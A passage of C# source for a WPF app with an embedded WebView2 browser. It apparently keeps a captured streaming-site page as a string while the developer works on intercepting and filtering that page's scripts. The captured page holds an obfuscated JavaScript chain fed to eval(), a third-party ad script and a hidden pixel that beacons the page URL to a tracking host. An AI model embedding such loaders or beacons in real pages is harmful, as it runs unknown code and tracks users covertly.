xokmg+XFDoaEqVzQk,qeHCR = XFDoaEqVzQk+qeHCR;\nTfNvPE = qeHCR+TfNvPE,TyvSG = TfNvPE+TyvSG,fozmqPtC = TyvSG+fozmqPtC;\nsQqkoKEN = fozmqPtC+sQqkoKEN;\ndyEZCY = sQqkoKEN+dyEZCY;\nklErJwQAX = dyEZCY+klErJwQAX;\nsAtkemjaof = klErJwQAX+sAtkemjaof,Uwiax = sAtkemjaof+Uwiax;\nHFOtBfePrlmuK = Uwiax+HFOtBfePrlmuK;\nAUuEioTH = HFOtBfePrlmuK+AUuEioTH,mrMqGAcoR = AUuEioTH+mrMqGAcoR;\nvIPpNQSCzotHlyD = mrMqGAcoR+vIPpNQSCzotHlyD;\nLbnIeds = vIPpNQSCzotHlyD+LbnIeds;\nyQVkgXDJ = LbnIeds+yQVkgXDJ;\ngqXSIPZCkHG = yQVkgXDJ+gqXSIPZCkHG;\ncwiXEH = gqXSIPZCkHG+cwiXEH,tRrLDSUA = cwiXEH+tRrLDSUA;\nFUgkmXjtQrJ = tRrLDSUA+FUgkmXjtQrJ;\nHEMSFgVcCUBr = FUgkmXjtQrJ+HEMSFgVcCUBr;\nVqKhH = HEMSFgVcCUBr+VqKhH;\nEeSlbYmkPq = VqKhH+EeSlbYmkPq,VKypqRF = EeSlbYmkPq+VKypqRF;\ndisXkZa = VKypqRF+disXkZa,IpPOChlqVGNbT = disXkZa+IpPOChlqVGNbT,EOHmj = IpPOChlqVGNbT+EOHmj;\nYlWbNsqPRT = EOHmj+YlWbNsqPRT;\ngsKmGMdDBU = YlWbNsqPRT+gsKmGMdDBU,FSYKqHtExdnzei = gsKmGMdDBU+FSYKqHtExdnzei,XMEVPjJil = FSYKqHtExdnzei+XMEVPjJil;\nSEUlhgJdmbDyir = XMEVPjJil+SEUlhgJdmbDyir;\nmlGsgZh = SEUlhgJdmbDyir+mlGsgZh;\nYCpynaomb = mlGsgZh+YCpynaomb;\nywlMSZKD = YCpynaomb+ywlMSZKD;\nJAmvY = ywlMSZKD+JAmvY,JPVlxnsr = JAmvY+JPVlxnsr,ZXQGDzCTL = JPVlxnsr+ZXQGDzCTL,OJQzyvBjWZFI = ZXQGDzCTL+OJQzyvBjWZFI;\nbduapVqUPrjx = OJQzyvBjWZFI+bduapVqUPrjx,BENaDfyhKAI = bduapVqUPrjx+BENaDfyhKAI;\nfprFgVQa = BENaDfyhKAI+fprFgVQa,qoaLJzVDx = fprFgVQa+qoaLJzVDx,BVTkdliYqNyI = qoaLJzVDx+BVTkdliYqNyI,UmIjvDR = BVTkdliYqNyI+UmIjvDR;\nLpOJf = UmIjvDR+LpOJf,iETYvoeMl = LpOJf+iETYvoeMl,kTcxLVynYi = iETYvoeMl+kTcxLVynYi,AfJLSTUu = kTcxLVynYi+AfJLSTUu;\nPSOUhTMCQwltY = AfJLSTUu+PSOUhTMCQwltY,SKIBMR = PSOUhTMCQwltY+SKIBMR;\nYzvUguw = SKIBMR+YzvUguw,LDWbrQGydueiJ = YzvUguw+LDWbrQGydueiJ,sdoCzXJkFjwc = LDWbrQGydueiJ+sdoCzXJkFjwc,StoBrIsp = sdoCzXJkFjwc+StoBrIsp;\nKidQuEvRoZxH = StoBrIsp+KidQuEvRoZxH;\ntSPqJNQRbhT = KidQuEvRoZxH+tSPqJNQRbhT,gvxqhcTfyjVB = tSPqJNQRbhT+gvxqhcTfyjVB,tWbxdjuKU = gvxqhcTfyjVB+tWbxdjuKU;\nGNkolquOZt = tWbxdjuKU+GNkolquOZt;\nyDxcIESrBl = GNkolquOZt+yDxcIESrBl,MzKVsijaLI = yDxcIESrBl+MzKVsijaLI;\ncnsbgoAmzyiHa = MzKVsijaLI+cnsbgoAmzyiHa;\nREeXr = cnsbgoAmzyiHa+REeXr;\nDtkjnCfXsh = REeXr+DtkjnCfXsh;\nJeENWGadx = DtkjnCfXsh+JeENWGadx,FJkhaAcjRHOPMTp = JeENWGadx+FJkhaAcjRHOPMTp;\nJisDMeNgHuBGwWx = FJkhaAcjRHOPMTp+JisDMeNgHuBGwWx,SNVGzD = JisDMeNgHuBGwWx+SNVGzD;\nbBAho = SNVGzD+bBAho,cCAfJqtXHgnKaDF = bBAho+cCAfJqtXHgnKaDF,gtwjNIyTEFpB = cCAfJqtXHgnKaDF+gtwjNIyTEFpB;\nvwEuiAXFlULapW = gtwjNIyTEFpB+vwEuiAXFlULapW,FUyeJGOtLAa = vwEuiAXFlULapW+FUyeJGOtLAa,tIeiZwNRMz = FUyeJGOtLAa+tIeiZwNRMz,ixPWlBZTaCzwsUf = tIeiZwNRMz+ixPWlBZTaCzwsUf,iEpVwdMgJvX = ixPWlBZTaCzwsUf+iEpVwdMgJvX;\noJPytpqxWHSj = iEpVwdMgJvX+oJPytpqxWHSj,meUpZwMCVbYFx = oJPytpqxWHSj+meUpZwMCVbYFx;\nvWgPdqCJUt = meUpZwMCVbYFx+vWgPdqCJUt;\nKLuyBfeOvrdE = vWgPdqCJUt+KLuyBfeOvrdE,BRNZmiCKt = KLuyBfeOvrdE+BRNZmiCKt,PrNMtLHlJSn = BRNZmiCKt+PrNMtLHlJSn;\nYFkMZG = PrNMtLHlJSn+YFkMZG,xmygGjqWrFK = YFkMZG+xmygGjqWrFK;\nqrxtBvDFUgef = xmygGjqWrFK+qrxtBvDFUgef;\nToLaeF = qrxtBvDFUgef+ToLaeF;\nkbjEs = ToLaeF+kbjEs,hjqmGwCMcSoVy = kbjEs+hjqmGwCMcSoVy;\nUNycbFVkqS = hjqmGwCMcSoVy+UNycbFVkqS;\nHhMWC = UNycbFVkqS+HhMWC,gWPYU = HhMWC+gWPYU,BMvnZscmHbJWP = gWPYU+BMvnZscmHbJWP;\nZWCHhojQweuyK = BMvnZscmHbJWP+ZWCHhojQweuyK;\nDhnrmsPUJ = ZWCHhojQweuyK+DhnrmsPUJ,rKRZE = DhnrmsPUJ+rKRZE,EKzkLVejmAQFn = rKRZE+EKzkLVejmAQFn;\nGfZqshBcSWimp = EKzkLVejmAQFn+GfZqshBcSWimp;\neRICipXak = GfZqshBcSWimp+eRICipXak;\nEdmavCZSeqWBO = eRICipXak+EdmavCZSeqWBO;\nvftxcMiTsoWzQ = EdmavCZSeqWBO+vftxcMiTsoWzQ,LxNOrlftEuXk = vftxcMiTsoWzQ+LxNOrlftEuXk;\nIYlSDzQHCafV = LxNOrlftEuXk+IYlSDzQHCafV,iwzaWMxfcOuebp = IYlSDzQHCafV+iwzaWMxfcOuebp;\nIGNencTP = iwzaWMxfcOuebp+IGNencTP;\nMCsiYZDjRHgAb = IGNencTP+MCsiYZDjRHgAb;\nigUBLyaGNwRQq = MCsiYZDjRHgAb+igUBLyaGNwRQq;\npNQTyLiwAFjrZ = igUBLyaGNwRQq+pNQTyLiwAFjrZ,nNfBGZgmwRQIr = pNQTyLiwAFjrZ+nNfBGZgmwRQIr,ZGvrdIg = nNfBGZgmwRQIr+ZGvrdIg;\ncSqHuvBDXJR = ZGvrdIg+cSqHuvBDXJR,JxZWUOlQzVrfMCK = cSqHuvBDXJR+JxZWUOlQzVrfMCK,rIKbOncjAiWdw = JxZWUOlQzVrfMCK+rIKbOncjAiWdw,XIsHRAKgBwk = rIKbOncjAiWdw+XIsHRAKgBwk;\nYGFUSXJ = XIsHRAKgBwk+YGFUSXJ;\nsOWipak = YGFUSXJ+sOWipak;\ntNGyYUmqcEXsJkS = sOWipak+tNGyYUmqcEXsJkS;\njeJZHQzh = tNGyYUmqcEXsJkS+jeJZHQzh,cLqwtsUeN = jeJZHQzh+cLqwtsUeN;\ncKSGuMBIktg = cLqwtsUeN+cKSGuMBIktg;\neval(cKSGuMBIktg);\n    </script>\n    <script data-cfasync=\"false\" async src=\"//andriesshied.com/riIsiJIsAMJy1d/13704\"></script><img class=\"d-none\" id=\"a6w4v5d7a9m9\" alt=\"a6w4v5d7a9m9\" src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+P+/HgAFhAJ/wlseKgAAAABJRU5ErkJggg==\"/><script>$(function () { const trkurl = 'https://plytv.rocks?v=espnhd~espnsd&d=desktop&u=vipleague.me&url=' + encodeURIComponent(window.location.href); const pixImg = '#a6w4v5d7a9m9'; $(pixImg).attr('src', trkurl + '&h=1'); let trks = setInterval(function () { $(pixImg).attr('src', trkurl + '&rf=1&ts=_' + new Date().getTime()); }, 180000); });</script></body></html>";

                        //override response content approach, suggested by:
                        //https://stackoverflow.com/questions/66428585/webview2-is-it-possible-to-prevent-a-cookie-in-a-response-from-being-stored/66432143#66432143

                        //using var deferral = e.GetDeferral();

                        //var client = httpClientFactory.CreateClient();
                        //var host = "https://" + new Uri(this.StartUrl).Host;
                        //client.DefaultRequestHeaders.Add("Origin", host);
                        //client.DefaultRequestHeaders.Add("Referer", e.Request.Headers.GetHeader("Referer"));

                        //var response = e.Request.Method == "POST" ? client.PostAsync(e.Request.Uri, null).Result : client.GetAsync(e.Request.Uri).Result;
                        ////var responseHeaders = String.Join("\n", response.Headers.Select(h => $"{h.Key}={h.Value}"));
                        ////var responseHeaders = response.Headers.ToString();
                        //var content = response.Content.ReadAsStringAsync().Result;
                        ////"https://sts.sinvida.me/scripts/v2/embed2.min.js?v=1"
                        ////if (new[] { "stattag", "sports.js", "partytown.js" }.Any(pattern => e.Request.Uri.Contains(pattern)))
                        //if (!e.Request.Uri.Contains("embed2.min.js"))
                        //{ // && (content.Contains("eval") || content.Contains("Eval") || content.Contains("debugger")))
                        //    e.Response = wv2.CoreWebView2.Environment.CreateWebResourceResponse(null, 404, "Not found", null);
                        //    return;
                        //}

                        //content = Regex.Replace(content, @"eval\((.*)\);", @"eval($1.replace(/eval\((.*)\)/, 'var zzz=$$1.replaceAll(""debugger;"",""""); eval( zzz )'));");
                        //e.Response = wv2.CoreWebView2.Environment.CreateWebResourceResponse(content.ToStream(), 200, "OK", null);

                        //deferral.Complete();

                        ////unnecessary:
                        //request.AddHeader("cookie", "tamedy=2");

                        //unnecessary: 
                        //request.AddParameter("ptxt", "gt=ESPN&gc=NFL");
                        //var bodycontent = (e.Request.Content as Stream).ToUtf8String().Split("&");
                        //foreach (var bodyParm in bodycontent)
                        //{
                        //    var bodyParmValue = bodyParm.Split("=");
                        //    request.AddParameter(bodyParmValue[0], System.Web.HttpUtility.UrlDecode(bodyParmValue[1]));
                        //}

                    };
                }
            };

            //wow deploying webView2 is quite complicated since it's a native dll requiring multiple platform versions of the same file
            //adding the await here means we'll at least see the exception when it's not being resolved properly!!!
            //https://github.com/MicrosoftEdge/WebView2Feedback/issues/730
            //try
            //{
            //    await wv2.EnsureCoreWebView2Async(); //this initializes wv2.CoreWebView2 (i.e. makes it not null)
            //}
            //catch (Exception ex)
            //{
            //    MessageBox.Show(ex.Message, "Error initializing embedded web browser", MessageBoxButton.OK, MessageBoxImage.Exclamation);
            //    return;
            //}

            //good thread on init: https://github.com/MicrosoftEdge/WebView2Feedback/issues/1577#issuecomment-930639679
            //most of the time you'll want all instance to share things like google authentication,
            //but i had a scenario where i needed to run voice under a separate account...
            //of course google allows having multiple accounts available, but there must always be a default from starting up cold
            //and this way you can control that more directly by having a dedicated UserData folder
            wv2.CreationProperties = new Microsoft.Web.WebView2.Wpf.CoreWebView2CreationProperties
            {
                UserDataFolder = Path.Combine(Directory.GetCurrentDirectory(), (this.SeparateUserData ? config["Title"] : "Shared") + " UserData")
            };

            //thinking it's pretty crucial to set this as the very last step after all the above configs have been applied since this is what triggers the loading of a page
            wv2.Source = new Uri(this.StartUrl);
        }

        private void Window_StateChanged(object sender, EventArgs e)
        {
            if (WindowState == WindowState.Normal)
            {
                //jiggling the window size upon re-dispaly avoids annoying little blank page bug
                Width += 1;
                Width -= 1;
            }
        }
    }

    public static class Extentions
    {
        public static Stream ToStream(this string value)
            => new MemoryStream(Encoding.UTF8.GetBytes(value ?? string.Empty));

        public static string ToUtf8String(this Stream stream)
        {
            byte[] bytes = new byte[stream.Length];
            stream.Read(bytes, 0, (int)stream.Length);
            return Encoding.UTF8.GetString(bytes);
        }
    }
}
